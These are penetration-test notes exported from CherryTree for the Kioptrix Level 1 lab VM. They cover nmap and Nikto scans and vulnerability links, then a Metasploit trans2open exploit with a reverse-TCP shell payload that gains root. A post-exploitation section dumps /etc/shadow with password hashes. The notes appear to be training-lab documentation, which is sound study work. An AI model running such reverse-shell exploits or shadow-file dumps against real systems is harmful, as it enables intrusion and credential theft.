<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Notes.ctb</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title level-1'>Assessment Notes</h1><br/><p></p><p><h1>Assessment Notes</h1></p><p></p><p></p></div><div class='page'><h1 class='title level-2'>Kioptrix (192.168.64.3)</h1><br/><p></p><p><h1>Kioptrix (192.168.64.3)</h1></p><p></p><p></p></div><div class='page'><h1 class='title level-3'>Findings</h1><br/><p></p><p><h1>Findings</h1></p><p></p><p></p></div><div class='page'><h1 class='title level-4'>Default Web Page - Apache</h1><br/></div><div class='page'><h1 class='title level-4'>Information Disclosure</h1><br/></div><div class='page'><h1 class='title level-3'>nmap</h1><br/><p></p><p><h1>nmap</h1></p><p></p><p>┌──(kali㉿kali)-[~]</p><p>└─$ nmap -A -p- -T4 192.168.64.3  </p><p>Starting Nmap 7.93 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2023-08-24 01:16 MST</p><p>Nmap scan report for 192.168.64.3</p><p>Host is up (0.00087s latency).</p><p>Not shown: 65529 closed tcp ports (conn-refused)</p><p>PORT      STATE SERVICE     VERSION</p><p>22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)</p><p>|_sshv1: Server supports SSHv1</p><p>| ssh-hostkey: </p><p>|   1024 b8746cdbfd8be666e92a2bdf5e6f6486 (RSA1)</p><p>|   1024 8f8e5b81ed21abc180e157a33c85c471 (DSA)</p><p>|_  1024 ed4ea94a0614ff1514ceda3a80dbe281 (RSA)</p><p>80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</p><p>|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</p><p>|_http-title: Test Page for the Apache Web Server on Red Hat Linux</p><p>| http-methods: </p><p>|_  Potentially risky methods: TRACE</p><p>111/tcp   open  rpcbind     2 (RPC #100000)</p><p>| rpcinfo: </p><p>|   program version    port/proto  service</p><p>|   100000  2            111/tcp   rpcbind</p><p>|   100000  2            111/udp   rpcbind</p><p>|   100024  1          32768/tcp   status</p><p>|_  100024  1          32768/udp   status</p><p>139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)</p><p>443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</p><p>| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</p><p>| Not valid before: 2009-09-26T09:32:06</p><p>|_Not valid after:  2010-09-26T09:32:06</p><p>|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</p><p>|_ssl-date: 2023-08-24T12:16:24+00:00; +3h59m59s from scanner time.</p><p>| sslv2: </p><p>|   SSLv2 supported</p><p>|   ciphers: </p><p>|     SSL2_DES_64_CBC_WITH_MD5</p><p>|     SSL2_DES_192_EDE3_CBC_WITH_MD5</p><p>|     SSL2_RC4_128_EXPORT40_WITH_MD5</p><p>|     SSL2_RC4_64_WITH_MD5</p><p>|     SSL2_RC2_128_CBC_WITH_MD5</p><p>|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</p><p>|_    SSL2_RC4_128_WITH_MD5</p><p>|_http-title: 400 Bad Request</p><p>32768/tcp open  status      1 (RPC #100024)</p><p></p><p>Host script results:</p><p>|_clock-skew: 3h59m58s</p><p>|_smb2-time: Protocol negotiation failed (SMB2)</p><p>|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)</p><p></p><p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .</p><p>Nmap done: 1 IP address (1 host up) scanned in 23.32 seconds</p><p></p></div><div class='page'><h1 class='title level-4'>139</h1><br/><p></p><p><h1>139</h1></p><p></p><p>Interesting Items:</p><p></p><p>SMB</p><p>Unix (Samba 2.2.1a)</p><p></p><p>Could anonymously connect to IPC with smbclient, but not Admin</p><p></p><p>139- Potentially Vulnerable to:</p><p><a href="https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/">https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/</a></p><p><a href="https://www.exploit-db.com/exploits/10">https://www.exploit-db.com/exploits/10</a></p><p><a href="https://www.exploit-db.com/exploits/7">https://www.exploit-db.com/exploits/7</a></p><p></p><p></p></div><div class='page'><h1 class='title level-4'>80-443</h1><br/><p></p><p><h1>80/443</h1></p><p></p><p>Interesting items:</p><p></p><p>80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</p><p></p><p>mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. </p><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082,">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082,</a> OSVDB-756.</p><p><a href="https://github.com/heltonWernik/OpenLuck">https://github.com/heltonWernik/OpenLuck</a></p><p></p></div><div class='page'><h1 class='title level-5'>Nikto</h1><br/><p></p><p><h1>Nikto</h1></p><p></p><p>┌──(kali㉿kali)-[~]</p><p>└─$ nikto -h <a href="http://192.168.64.3">http://192.168.64.3</a>   </p><p>- Nikto v2.1.6</p><p>---------------------------------------------------------------------------</p><p>+ Target IP:          192.168.64.3</p><p>+ Target Hostname:    192.168.64.3</p><p>+ Target Port:        80</p><p>+ Start Time:         2023-08-24 01:58:43 (GMT-7)</p><p>---------------------------------------------------------------------------</p><p>+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</p><p>+ Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 20:12:46 2001</p><p>+ The anti-clickjacking X-Frame-Options header is not present.</p><p>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</p><p>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</p><p>+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header</p><p>+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)</p><p>+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.</p><p>+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</p><p>+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.</p><p>+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.</p><p>+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.</p><p>+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082,">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082,</a> OSVDB-756.</p><p>+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE </p><p>+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</p><p>+ ///etc/hosts: The server install allows reading of any system file by adding an extra &#39;/&#39; to the URL.</p><p>+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).</p><p>+ OSVDB-3268: /manual/: Directory indexing found.</p><p>+ OSVDB-3092: /manual/: Web server manual found.</p><p>+ OSVDB-3268: /icons/: Directory indexing found.</p><p>+ OSVDB-3233: /icons/README: Apache default file found.</p><p>+ OSVDB-3092: /test.php: This might be interesting...</p><p>+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</p><p>+ /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</p><p>+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</p><p>+ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</p><p>+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</p><p>+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</p><p>+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.</p><p>+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.</p><p>+ /shell?cat+/etc/hosts: A backdoor was identified.</p><p>+ 8724 requests: 0 error(s) and 30 item(s) reported on remote host</p><p>+ End Time:           2023-08-24 01:59:02 (GMT-7) (19 seconds)</p><p>---------------------------------------------------------------------------</p><p>+ 1 host(s) tested</p><p></p></div><div class='page'><h1 class='title level-4'>22</h1><br/><p></p><p><h1>22</h1></p><p></p><p>SSH</p><p> OpenSSH 2.9p2 (protocol 1.99)</p><p> </p><p> 22- Possible Vulnerabilities</p><p> <a href="https://www.exploit-db.com/exploits/21402">https://www.exploit-db.com/exploits/21402</a></p><p></p></div><div class='page'><h1 class='title level-3'>Exploitation</h1><br/></div><div class='page'><h1 class='title level-4'>SMB - trans2open</h1><br/><p>msf6 exploit(linux/samba/trans2open) &gt; set payload linux/x86/shell_reverse_tcp</p><p>payload =&gt; linux/x86/shell_reverse_tcp</p><p>msf6 exploit(linux/samba/trans2open) &gt; exploit</p><p></p><p>[*] Started reverse TCP handler on 192.168.64.2:4444 </p><p>[*] 192.168.64.3:139 - Trying return address 0xbffffdfc...</p><p>[*] 192.168.64.3:139 - Trying return address 0xbffffcfc...</p><p>[*] 192.168.64.3:139 - Trying return address 0xbffffbfc...</p><p>[*] 192.168.64.3:139 - Trying return address 0xbffffafc...</p><p>[*] 192.168.64.3:139 - Trying return address 0xbffff9fc...</p><p>[*] 192.168.64.3:139 - Trying return address 0xbffff8fc...</p><p>[*] 192.168.64.3:139 - Trying return address 0xbffff7fc...</p><p>[*] 192.168.64.3:139 - Trying return address 0xbffff6fc...</p><p>[*] Command shell session 5 opened (192.168.64.2:4444 -&gt; 192.168.64.3:33004) at 2023-08-25 00:20:48 -0700</p><p></p><p>[*] Command shell session 6 opened (192.168.64.2:4444 -&gt; 192.168.64.3:33005) at 2023-08-25 00:20:49 -0700</p><p>[*] Command shell session 7 opened (192.168.64.2:4444 -&gt; 192.168.64.3:33006) at 2023-08-25 00:20:50 -0700</p><p>[*] Command shell session 8 opened (192.168.64.2:4444 -&gt; 192.168.64.3:33007) at 2023-08-25 00:20:51 -0700</p><p></p><p>whoami</p><p>root</p><p>hostname</p><p>kioptrix.level1</p><p><img src="images/13-1.png" alt="images/13-1.png" /></p></div><div class='page'><h1 class='title level-4'>80 - modssl</h1><br/></div><div class='page'><h1 class='title level-3'>Post Exploitation</h1><br/></div><div class='page'><h1 class='title level-4'>Shadow File</h1><br/><p>whoami</p><p>root</p><p>hostname</p><p>kioptrix.level1</p><p>cat /etc/shadow</p><p>root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::</p><p>bin:*:14513:0:99999:7:::</p><p>daemon:*:14513:0:99999:7:::</p><p>adm:*:14513:0:99999:7:::</p><p>lp:*:14513:0:99999:7:::</p><p>sync:*:14513:0:99999:7:::</p><p>shutdown:*:14513:0:99999:7:::</p><p>halt:*:14513:0:99999:7:::</p><p>mail:*:14513:0:99999:7:::</p><p>news:*:14513:0:99999:7:::</p><p>uucp:*:14513:0:99999:7:::</p><p>operator:*:14513:0:99999:7:::</p><p>games:*:14513:0:99999:7:::</p><p>gopher:*:14513:0:99999:7:::</p><p>ftp:*:14513:0:99999:7:::</p><p>nobody:*:14513:0:99999:7:::</p><p>mailnull:!!:14513:0:99999:7:::</p><p>rpm:!!:14513:0:99999:7:::</p><p>xfs:!!:14513:0:99999:7:::</p><p>rpc:!!:14513:0:99999:7:::</p><p>rpcuser:!!:14513:0:99999:7:::</p><p>nfsnobody:!!:14513:0:99999:7:::</p><p>nscd:!!:14513:0:99999:7:::</p><p>ident:!!:14513:0:99999:7:::</p><p>radvd:!!:14513:0:99999:7:::</p><p>postgres:!!:14513:0:99999:7:::</p><p>apache:!!:14513:0:99999:7:::</p><p>squid:!!:14513:0:99999:7:::</p><p>pcap:!!:14513:0:99999:7:::</p><p>john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::</p><p>harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::</p></div><div class='page'><h1 class='title level-1'>index</h1><br/><p> <strong>Index</strong> Expand All Collapse All </p><p>• - Assessment Notes</p><p>◇ - Kioptrix (192.168.64.3)</p><p>▪ - nmap</p><p>- 22</p><p>- - 80/443</p><p>→ Nikto</p><p></p><p>- 139</p><p></p><p>▪ - Findings</p><p>- Default Web Page - Apache</p><p>- Information Disclosure</p><p></p><p>▪ - Exploitation</p><p>- SMB - trans2open</p><p>- 80 - modssl</p><p></p><p>▪ - Post Exploitation</p><p>- Shadow File</p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p></div>
</body>
</html>
